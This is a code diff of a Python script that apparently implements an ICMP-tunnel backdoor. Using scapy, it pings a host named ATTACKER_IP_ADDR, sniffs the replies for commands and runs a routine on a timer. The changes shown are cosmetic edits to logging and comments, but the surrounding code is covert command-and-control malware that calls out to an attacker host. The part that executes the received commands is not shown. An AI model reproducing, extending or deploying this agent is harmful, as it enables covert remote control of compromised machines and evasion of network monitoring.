@@ -18,7 +18,7 @@ DEFAULT_PAYLOAD = b''
 def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=2):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
-    print("Sending packet:", request.show())
+    print("Sent packet:", request.show())
     return receive_response_packet(request, timeout, nb_responses)
 
 
@@ -70,11 +70,11 @@ def retrieve_command(response):
 
 
 def receive_response_packet(request, timeout, nb_responses):
-    print("Start Receiving packet")
     packets = []
     for index in range(nb_responses):
-        packets.append(scapy.sniff(stop_filter=lambda response: match_response_to_request(response, request), timeout=timeout))
-    print("End Receiving packet:", packets[1].show())
+        packets.append(
+            scapy.sniff(stop_filter=lambda response: match_response_to_request(response, request), timeout=timeout, prn=lambda packet: packet.summary()))
+    print("Received packet:", packets[1].show())
     return packets[1]
 
 
@@ -84,7 +84,7 @@ def can_proceed(ip_addr):
 
 
 def match_response_to_request(response, request):
-    print(response.show(), request.show())
+    # print(response.show(), request.show())
     return response.haslayer(scapy.ICMP) \
         and response[scapy.IP].src == request[scapy.IP].dst \
         and response[scapy.IP].dst == request[scapy.IP].src \
@@ -143,14 +143,14 @@ def forge_random_command():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    #while True:
-        #try:
+    # while True:
+    # try:
     if can_proceed(ATTACKER_IP_ADDR):
         accomplish_routine(ATTACKER_IP_ADDR)
-                #except Exception as err:
-            #print(f"Unexpected {err=}, {type(err)=}")
-            #else:
+        # except Exception as err:
+        # print(f"Unexpected {err=}, {type(err)=}")
+        # else:
         #    print("Nothing went wrong!")
-        #finally:
+        # finally:
         #    print(f"See you in {FREQUENCY} min(s)")
     time.sleep(FREQUENCY)
